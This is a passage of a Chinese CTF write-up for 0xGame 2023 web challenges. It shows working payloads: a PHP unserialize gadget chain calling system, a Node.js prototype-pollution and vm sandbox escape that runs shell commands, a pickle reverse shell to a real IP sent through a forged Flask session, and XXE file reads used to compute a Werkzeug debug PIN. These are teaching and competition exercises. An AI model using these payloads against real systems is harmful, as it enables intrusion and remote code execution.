<pre><code class="hljs php">O:<span class="hljs-number">10</span>:<span class="hljs-string">"DataObject"</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">7</span>:<span class="hljs-string">"storage"</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">"Storage"</span>:<span class="hljs-number">1</span>:{s:<span class="hljs-number">5</span>:<span class="hljs-string">"store"</span>;N;}s:<span class="hljs-number">4</span>:<span class="hljs-string">"data"</span>;a:<span class="hljs-number">2</span>:{s:<span class="hljs-number">4</span>:<span class="hljs-string">"key1"</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">"Cache"</span>:<span class="hljs-number">4</span>:{s:<span class="hljs-number">3</span>:<span class="hljs-string">"key"</span>;N;s:<span class="hljs-number">5</span>:<span class="hljs-string">"value"</span>;N;s:<span class="hljs-number">7</span>:<span class="hljs-string">"expired"</span>;N;s:<span class="hljs-number">6</span>:<span class="hljs-string">"helper"</span>;N;}s:<span class="hljs-number">4</span>:<span class="hljs-string">"key2"</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">"Cache"</span>:<span class="hljs-number">4</span>:{s:<span class="hljs-number">3</span>:<span class="hljs-string">"key"</span>;s:<span class="hljs-number">19</span>:<span class="hljs-string">"php -r "</span><span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-string">""</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">"value"</span>;N;s:<span class="hljs-number">7</span>:<span class="hljs-string">"expired"</span>;R:<span class="hljs-number">3</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">"helper"</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">"Helper"</span>:<span class="hljs-number">1</span>:{s:<span class="hljs-number">5</span>:<span class="hljs-string">"funcs"</span>;a:<span class="hljs-number">1</span>:{s:<span class="hljs-number">5</span>:<span class="hljs-string">"clean"</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">"system"</span>;}}}}}</code></pre>
<p>输出如上，这里也是看别人wp知道flag被放在了环境变量中，这里它采用读取phpinfo的方法。但令我疑惑的是为何直接赋值为phpinfo()的话执行不了。。。</p>
<p>![image-20231023191959782](0xGame 2023/image-20231023191959782.png)</p>
<p>拿到flag</p>
<h2 id="week-2-ez_sandbox">[Week 2] ez_sandbox</h2>
<p>打开题目发现一个登录框，弱口令无果，扔给dirsearch扫目录，随后用bp抓一个登录包数据看看有何信息：</p>
<p>![image-20231026195758333](0xGame 2023/image-20231026195758333.png)</p>
<p>如上图是一个json数据块，其中包含用户名和密码，其次扫目录发现存在注册用户页面，看题目名称为沙箱，也没思路，于是看wp发现考察nodejs沙箱逃逸和原型链污染（懵逼了，这玩意儿没咋好好学，┭┮﹏┭┮）只能浑水摸鱼了，写完wp后就学！！！</p>
<p>代码在注册和登录的时候使⽤了 clone(req.body)</p>
<pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">merge</span>(<span class="hljs-params">target, source</span>) {
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> key <span class="hljs-keyword">in</span> source) {
        <span class="hljs-keyword">if</span> (key === <span class="hljs-string">'__proto__'</span>) {
        <span class="hljs-keyword">continue</span>
    }
    <span class="hljs-keyword">if</span> (key <span class="hljs-keyword">in</span> source &amp;&amp; key <span class="hljs-keyword">in</span> target) {
        <span class="hljs-title function_">merge</span>(target[key], source[key])
    } <span class="hljs-keyword">else</span> {
        target[key] = source[key]
    	}
    }
    <span class="hljs-keyword">return</span> target
}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">clone</span>(<span class="hljs-params">source</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-title function_">merge</span>({}, source)
}</code></pre>
<p>根据⼀些参考⽂章, 很容易就可以知道这⾥存在原型链污染, 但是 <strong>proto</strong> 关键词被过滤了<br>
如果你对原型链这个概念稍微做⼀点深⼊了解, 就可以知道, 对于⼀个实例对象, 它的 <strong>proto</strong> 就等于<code>constructor.prototype</code>这样可以绕过proto关键词的过滤</p>
<p>先注册⼀个 test用户, 在登录时 POST 如下内容, 污染 admins 对象, 使得 username in admins 表达式的结果为True</p>
<pre><code class="hljs json"><span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"username"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"test"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"password"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"test"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"constructor"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        <span class="hljs-attr">"prototype"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
        	<span class="hljs-attr">"test"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"123"</span>
		<span class="hljs-punctuation">}</span>
	<span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span></code></pre>
<p>![image-20231026201904531](0xGame 2023/image-20231026201904531.png)</p>
<p>随后test 123登录进去发现成功得到admin用户权限</p>
<p>![image-20231026201951999](0xGame 2023/image-20231026201951999.png)</p>
<p>然后是⼀个简单的 vm 沙箱逃逸</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11859">https://xz.aliyun.com/t/11859</a></p>
<p>代码会 catch vm 沙箱执⾏时抛出的异常, 并访问异常的 message 属性</p>
<p>那么结合上面的文章, 可以通过 throw 抛出对象的思路, 拿到 arguments.callee.caller (指向</p>
<p>当前函数的调用者), 然后拿到沙箱外的 process 对象, 最终实现 RCE</p>
<p>waf 函数有⼀些简单的关键词过滤, 不过因为 Javascript 语言本身非常灵活, 所以可以使用中</p>
<p>括号 + 字符串拼接的形式绕过</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/237032">https://www.anquanke.com/post/id/237032</a></p>
<p>下面两种方式都行</p>
<pre><code class="hljs json"><span class="hljs-comment">// method 1</span>
throw new Proxy(<span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">{</span> <span class="hljs-comment">// Proxy 对象⽤于创建对某⼀对象的代理, 以实现属性和⽅法的拦截</span>
    get<span class="hljs-punctuation">:</span> function()<span class="hljs-punctuation">{</span> <span class="hljs-comment">// 访问这个对象的任意⼀个属性都会执⾏ get 指向的函数</span>
        const c = arguments.callee.caller
        const p = (c<span class="hljs-punctuation">[</span>'constru'+'ctor'<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>'constru'+'ctor'<span class="hljs-punctuation">]</span>('return pro'+'cess'))()
        return p<span class="hljs-punctuation">[</span>'mainM'+'odule'<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>'requi'+'re'<span class="hljs-punctuation">]</span>('child_pr'+'ocess')<span class="hljs-punctuation">[</span>'ex'+'ecSync'<span class="hljs-punctuation">]</span>('cat /flag').toString();
	<span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>)

<span class="hljs-comment">// method 2</span>
let obj = <span class="hljs-punctuation">{</span><span class="hljs-punctuation">}</span> <span class="hljs-comment">// 针对该对象的 message 属性定义⼀个 getter, 当访问 obj.message 时会调⽤对应的函数</span>
obj.__defineGetter__('message'<span class="hljs-punctuation">,</span> function()<span class="hljs-punctuation">{</span>
    const c = arguments.callee.caller
    const p = (c<span class="hljs-punctuation">[</span>'constru'+'ctor'<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>'constru'+'ctor'<span class="hljs-punctuation">]</span>('return pro'+'cess'))()
    return p<span class="hljs-punctuation">[</span>'mainM'+'odule'<span class="hljs-punctuation">]</span><span class="hljs-punctuation">[</span>'requi'+'re'<span class="hljs-punctuation">]</span>('child_pr'+'ocess')<span class="hljs-punctuation">[</span>'ex'+'ecSync'<span class="hljs-punctuation">]</span>('cat /flag').toString();
<span class="hljs-punctuation">}</span>)
throw obj</code></pre>
<p>![image-20231026202002001](0xGame 2023/image-20231026202002001.png)</p>
<p>拿到flag（等我深入学习一波再回来思考</p>
<h2 id="week-3-notebook">[Week 3] notebook</h2>
<p>![image-20231026203700101](0xGame 2023/image-20231026203700101.png)</p>
<p>打开题目是一个笔记本 ？？？,这里测试了一番发现不是xss等漏洞，搜目录也没有信息，根据题目提示说是该项目由flask框架搭建。之后看了wp发现考察的是session伪构造，pickle反序列化，反弹shell</p>
<p>题目源码如下：</p>
<pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, render_template, session
<span class="hljs-keyword">import</span> pickle
<span class="hljs-keyword">import</span> uuid
<span class="hljs-keyword">import</span> os

app = Flask(__name__)
app.config[<span class="hljs-string">'SECRET_KEY'</span>] = os.urandom(<span class="hljs-number">2</span>).<span class="hljs-built_in">hex</span>()

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Note</span>(<span class="hljs-title class_ inherited__">object</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, content</span>):
        self._name = name
        self._content = content

<span class="hljs-meta">    @property</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">name</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> self._name
    
<span class="hljs-meta">    @property</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">content</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> self._content


<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/'</span></span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():
    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'index.html'</span>)


<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/&lt;path:note_id&gt;'</span>, methods=[<span class="hljs-string">'GET'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">view_note</span>(<span class="hljs-params">note_id</span>):
    notes = session.get(<span class="hljs-string">'notes'</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> notes:
        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'note.html'</span>, msg=<span class="hljs-string">'You have no notes'</span>)
    
    note_raw = notes.get(note_id)
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> note_raw:
        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'note.html'</span>, msg=<span class="hljs-string">'This note does not exist'</span>)
    
    note = pickle.loads(note_raw)
    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'note.html'</span>, note_id=note_id, note_name=note.name, note_content=note.content)


<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/add_note'</span>, methods=[<span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add_note</span>():
    note_name = request.form.get(<span class="hljs-string">'note_name'</span>)
    note_content = request.form.get(<span class="hljs-string">'note_content'</span>)

    <span class="hljs-keyword">if</span> note_name == <span class="hljs-string">''</span> <span class="hljs-keyword">or</span> note_content == <span class="hljs-string">''</span>:
        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'index.html'</span>, status=<span class="hljs-string">'add_failed'</span>, msg=<span class="hljs-string">'note name or content is empty'</span>)
    
    note_id = <span class="hljs-built_in">str</span>(uuid.uuid4())
    note = Note(note_name, note_content)

    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">'notes'</span>):
        session[<span class="hljs-string">'notes'</span>] = {}
    
    notes = session[<span class="hljs-string">'notes'</span>]
    notes[note_id] = pickle.dumps(note)
    session[<span class="hljs-string">'notes'</span>] = notes
    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'index.html'</span>, status=<span class="hljs-string">'add_success'</span>, note_id=note_id)


<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/delete_note'</span>, methods=[<span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_note</span>():
    note_id = request.form.get(<span class="hljs-string">'note_id'</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> note_id:
        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'index.html'</span>)
    
    notes = session.get(<span class="hljs-string">'notes'</span>)
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> notes:
        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'index.html'</span>, status=<span class="hljs-string">'delete_failed'</span>, msg=<span class="hljs-string">'You have no notes'</span>)
    
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> notes.get(note_id):
        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'index.html'</span>, status=<span class="hljs-string">'delete_failed'</span>, msg=<span class="hljs-string">'This note does not exist'</span>)
    
    <span class="hljs-keyword">del</span> notes[note_id]
    session[<span class="hljs-string">'notes'</span>] = notes
    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'index.html'</span>, status=<span class="hljs-string">'delete_success'</span>)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    app.run(host=<span class="hljs-string">'0.0.0.0'</span>, port=<span class="hljs-number">8000</span>, debug=<span class="hljs-literal">False</span>)</code></pre>
<p>这里由于没学过相关知识，我还是跟着wp走一遍吧，后续再去补</p>
<p>这里分析一遍代码会发现，存在secret key，这里就是让我们利用其去session伪造</p>
<pre><code class="hljs plaintext">⾸先得知道 flask 的 session 信息存储在 cookie 中, 因此这种 session 也被称作 "客户端 session"
⽽ session 要想保证不被恶意修改, 就会使⽤⼀个 secret key 进⾏签名
注意 "签名" 不等于 "加密", 我们其实仍然能够看到 session 中存储的信息, 但是⽆法修改它, 这⼀点和 JWT (JSON Web Token) 类似</code></pre>
<p>题目中的 secret key，这⾥留了个随机数主要是让⼤家关注随机数的长度, 如果这个长度过小, 那么很容易就能爆破出来，⼀部分人可能不知道它长度是多少, 这个其实放到 python 里面运行⼀下就知道了, 只有 4 位，然后因为是 hex, 所以只会出现 0123456789abcdef 这些字符</p>
<p>![image-20231104101618909](0xGame 2023/image-20231104101618909.png)</p>
<p>如图所示，可以看到位数是4位，接下来先手动生成⼀个四位数字典</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> itertools
d = itertools.product(<span class="hljs-string">'0123456789abcdef'</span>, repeat=<span class="hljs-number">4</span>)
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">'dicts.txt'</span>, <span class="hljs-string">'w'</span>) <span class="hljs-keyword">as</span> f:
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:
        s = <span class="hljs-string">''</span>.join(i)
        f.write(s + <span class="hljs-string">'\n'</span>)</code></pre>
<p>利用session伪造工具：<a target="_blank" rel="noopener" href="https://github.com/Paradoxis/Flask-Unsign">https://github.com/Paradoxis/Flask-Unsign</a></p>
<p>将上述脚本生成的txt复制到工具的目录下，随后输入如下命令</p>
<pre><code class="hljs http">flask-unsign --unsign --cookie ".eJwti1sLgjAYQP9K7H0w5qZ8gg82MqULmJeZb9vwks0KCnwQ_3sJHThv58zo8fw0b-TPyGPMczlhmCkDmDXKYFDgYAKUM8dVwFy1dhuNfNSFWZmm4R9xEhG0WkYvbaG1ybTLRyB1neVWjFsb0-KQTFFFea-lLIaw7A299IZn6zdoykktOfl9-2t1vq_auLwduyBAy7J8ARAdMR4.ZUW4BQ.76TUC_1vDgzmCy2DVpM6xWsZQyc" --wordlist dicts.txt --no-literal-eval</code></pre>
<p>这里的cookie的获取是如下图所示的页面下的cookie</p>
<p>![image-20231104112534159](0xGame 2023/image-20231104112534159.png)</p>
<p>![image-20231104105505385](0xGame 2023/image-20231104105505385.png)</p>
<p>如图成功爆破，然后就是利用路由<code>/&lt;path:note_id&gt;</code>下的pickle反序列化，这里用的是反弹shell，payload如下（）</p>
<pre><code class="hljs shell">b'''cos
system
(S"bash -c 'bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1'"
tR.
'''</code></pre>
<p>然后就是session伪造，注意note_id值要为对应值</p>
<pre><code class="hljs shell">flask-unsign --sign --cookie "{'notes': {'74476504-4ac9-4eac-9a93-0925436a946a': b'''cos\nsystem\n(S'bash -c \'bash -i &gt;&amp; /dev/tcp/124.220.233.26/5555 0&gt;&amp;1\''\ntR.'''}}" --secret 143b --no-literal-eval</code></pre>
<p>这里由于cookie周围被双引号包围，故我们里面的shell只能都用单引号，起冲突的我们要用\转义</p>
<p>![image-20231104110414689](0xGame 2023/image-20231104110414689.png)</p>
<p>如图成功加密，我们刷新页面bp抓包，替换上述cookie发送即可，同时我们的vps要开启监听（注意端口要在安全组放开）</p>
<p>![image-20231104112644645](0xGame 2023/image-20231104112644645.png)</p>
<p>![image-20231104112416629](0xGame 2023/image-20231104112416629.png)</p>
<p>![image-20231104112349809](0xGame 2023/image-20231104112349809.png)</p>
<p>成功反弹shell拿到flag</p>
<h2 id="week-3-rss_parser">[Week 3] rss_parser</h2>
<p>这道题看不懂，先跟着wp复现完，最后学相关知识吧</p>
<pre><code class="hljs py"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, redirect
<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> unquote
<span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree
<span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> re

app = Flask(__name__)

<span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">'/'</span>, methods=[<span class="hljs-string">'GET'</span>, <span class="hljs-string">'POST'</span>]</span>)</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():
    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">'GET'</span>:
        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'index.html'</span>)
    <span class="hljs-keyword">else</span>:
        feed_url = request.form[<span class="hljs-string">'url'</span>]
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">r'^(http|https)://'</span>, feed_url):
            <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">'/'</span>)

        content = requests.get(feed_url).content
        tree = etree.parse(BytesIO(content), etree.XMLParser(resolve_entities=<span class="hljs-literal">True</span>))

        result = {}

        rss_title = tree.find(<span class="hljs-string">'/channel/title'</span>).text
        rss_link = tree.find(<span class="hljs-string">'/channel/link'</span>).text
        rss_posts = tree.findall(<span class="hljs-string">'/channel/item'</span>)

        result[<span class="hljs-string">'title'</span>] = rss_title
        result[<span class="hljs-string">'link'</span>] = rss_link
        result[<span class="hljs-string">'posts'</span>] = []

        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(rss_posts) &gt;= <span class="hljs-number">10</span>:
            rss_posts = rss_posts[:<span class="hljs-number">10</span>]

        <span class="hljs-keyword">for</span> post <span class="hljs-keyword">in</span> rss_posts:
            post_title = post.find(<span class="hljs-string">'./title'</span>).text
            post_link = post.find(<span class="hljs-string">'./link'</span>).text
            result[<span class="hljs-string">'posts'</span>].append({<span class="hljs-string">'title'</span>: post_title, <span class="hljs-string">'link'</span>: unquote(post_link)})
 
        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">'index.html'</span>, feed_url=feed_url, result=result)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    app.run(host=<span class="hljs-string">'0.0.0.0'</span>, port=<span class="hljs-number">8000</span>, debug=<span class="hljs-literal">True</span>)</code></pre>
<p>这里题目给了源码，这里看到关键词就是xml，etree，猜测就是xxe漏洞了，翻了翻笔记：</p>
<pre><code class="hljs py">Python：
<span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="hljs-literal">False</span>))</code></pre>
<p>上述代码是经典的防止解析外部xml的防御代码，与题目给的代码进行比较<code>resolve_entities=True</code>，我们可以很容易的发现题目是存在xxe漏洞的</p>
<p>将一个符合 RSS Feed XML 标准的 payload 放到 HTTP 服务器上就可以 XXE (也可以参考 <code>https://exp10it.cn/index.xml</code> 改一改)</p>
<p>这里我感觉参考：<a target="_blank" rel="noopener" href="https://support.google.com/merchants/answer/160589?hl=zh-Hans%E4%B9%9F%E6%98%AF%E5%8F%AF%E4%BB%A5%E6%94%B9%E6%94%B9%E7%9A%84">https://support.google.com/merchants/answer/160589?hl=zh-Hans也是可以改改的</a></p>
<p>但是无法直接读取 /flag 文件, 这里考察获取 Flask 在 Debug 模式下的 PIN Code 以实现 RCE</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8092">https://xz.aliyun.com/t/8092</a></p>
<p><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2022/05/16/SecMap-flask/">https://www.tr0y.wang/2022/05/16/SecMap-flask/</a></p>
<p>读取 <code>/sys/class/net/eth0/address</code></p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span>
<span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">"file:///sys/class/net/eth0/address"</span>&gt;</span>]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">rss</span> <span class="hljs-attr">xmlns:atom</span>=<span class="hljs-string">"http://www.w3.org/2005/Atom"</span> <span class="hljs-attr">version</span>=<span class="hljs-string">"2.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">channel</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">link</span>&gt;</span>vps-ip<span class="hljs-tag">&lt;/<span class="hljs-name">link</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">item</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">link</span>&gt;</span>vps-ip<span class="hljs-tag">&lt;/<span class="hljs-name">link</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">channel</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">rss</span>&gt;</span></code></pre>
<p>至于为何是上述payload这种格式，这就得参考代码处的：</p>
<pre><code class="hljs py">rss_title = tree.find(<span class="hljs-string">'/channel/title'</span>).text
rss_link = tree.find(<span class="hljs-string">'/channel/link'</span>).text
rss_posts = tree.findall(<span class="hljs-string">'/channel/item'</span>)</code></pre>
<p>也就是说我们的xml-payload中必须含有<code>channel/title、/channel/link、/channel/item</code>，在看如下</p>
<pre><code class="hljs py">post_title = post.find(<span class="hljs-string">'./title'</span>).text
post_link = post.find(<span class="hljs-string">'./link'</span>).text</code></pre>
<p>这意味着我们还要有<code>/channel/item/title、/channel/item/link</code></p>
<p>![image-20231104182023515](0xGame 2023/image-20231104182023515.png)</p>
<p>如图成功读取：<code>02:42:ac:1c:00:02</code></p>
<p>转换为十进制<code>2485378613250</code></p>
<pre><code class="hljs py"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">int</span>(<span class="hljs-string">'02:42:ac:1c:00:02'</span>.replace(<span class="hljs-string">':'</span>,<span class="hljs-string">''</span>),<span class="hljs-number">16</span>))</code></pre>
<p>然后读取 machine id 或者 boot id</p>
<p>因为这里不存在 <code>/etc/machine-id</code>, 所以读取 <code>/proc/sys/kernel/random/boot_id</code></p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span>
<span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">"file:///proc/sys/kernel/random/boot_id"</span>&gt;</span>]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">rss</span> <span class="hljs-attr">xmlns:atom</span>=<span class="hljs-string">"http://www.w3.org/2005/Atom"</span> <span class="hljs-attr">version</span>=<span class="hljs-string">"2.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">channel</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">link</span>&gt;</span>vps-ip<span class="hljs-tag">&lt;/<span class="hljs-name">link</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">item</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">link</span>&gt;</span>vps-ip<span class="hljs-tag">&lt;/<span class="hljs-name">link</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">item</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">channel</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">rss</span>&gt;</span></code></pre>
<p>结果为：<code>5dcbb593-2656-4e8e-a4e9-9a0afb803c47</code></p>
<p>然后根据上面的文章, 读取 <code>/proc/self/cgroup</code> 显示 <code>0::/</code>, 也就是没有 id 值, 所以不用拼接, 直接用上面的 boot id 就行</p>
<p>![image-20231104182600936](0xGame 2023/image-20231104182600936.png)</p>
<p>剩下的 username 可以通过读取 <code>/etc/passwd</code> 来猜一下, 一般都是 <code>root</code> 或者最底下的用户 <code>app</code>, 多试几个就行</p>
<p>![image-20231104182652180](0xGame 2023/image-20231104182652180.png)</p>
<p>最后随便填一个 url, 比如 <code>https://exp10it.cn/xxx</code> 就能在报错页面看到 flask 的路径</p>
<p>exp (注意新版本 flask 计算 pin code 时用的是 sha1, 旧版本才是 md5)</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> hashlib
<span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain
probably_public_bits = [
    <span class="hljs-string">'app'</span><span class="hljs-comment"># username</span>
    <span class="hljs-string">'flask.app'</span>,<span class="hljs-comment"># modname</span>
    <span class="hljs-string">'Flask'</span>,<span class="hljs-comment"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span>
    <span class="hljs-string">'/usr/local/lib/python3.9/site-packages/flask/app.py'</span> <span class="hljs-comment"># getattr(mod, '__file__', None),</span>
]

private_bits = [
    <span class="hljs-string">'2485378613250'</span>,<span class="hljs-comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span>
    <span class="hljs-string">'5dcbb593-2656-4e8e-a4e9-9a0afb803c47'</span><span class="hljs-comment"># get_machine_id(), /etc/machine-id</span>
]

h = hashlib.sha1()
<span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:
        <span class="hljs-keyword">continue</span>
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):
        bit = bit.encode(<span class="hljs-string">"utf-8"</span>)
    h.update(bit)
h.update(<span class="hljs-string">b"cookiesalt"</span>)

cookie_name = <span class="hljs-string">f"__wzd<span class="hljs-subst">{h.hexdigest()[:<span class="hljs-number">20</span>]}</span>"</span>

<span class="hljs-comment"># If we need to generate a pin we salt it a bit more so that we don't</span>
<span class="hljs-comment"># end up with the same value and generate out 9 digits</span>
num = <span class="hljs-literal">None</span>
<span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
    h.update(<span class="hljs-string">b"pinsalt"</span>)
    num = <span class="hljs-string">f"<span class="hljs-subst">{<span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>):09d}</span>"</span>[:<span class="hljs-number">9</span>]

<span class="hljs-comment"># Format the pincode in groups of digits for easier remembering if</span>
<span class="hljs-comment"># we don't have a result yet.</span>
rv = <span class="hljs-literal">None</span>
<span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:
        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:
            rv = <span class="hljs-string">"-"</span>.join(
                num[x : x + group_size].rjust(group_size, <span class="hljs-string">"0"</span>)
                <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size)
            )
            <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">else</span>:
        rv = num

<span class="hljs-built_in">print</span>(rv)</code></pre>
<p>![image-20231104182908326](0xGame 2023/image-20231104182908326.png)</p>
<p>运行得到pin码</p>
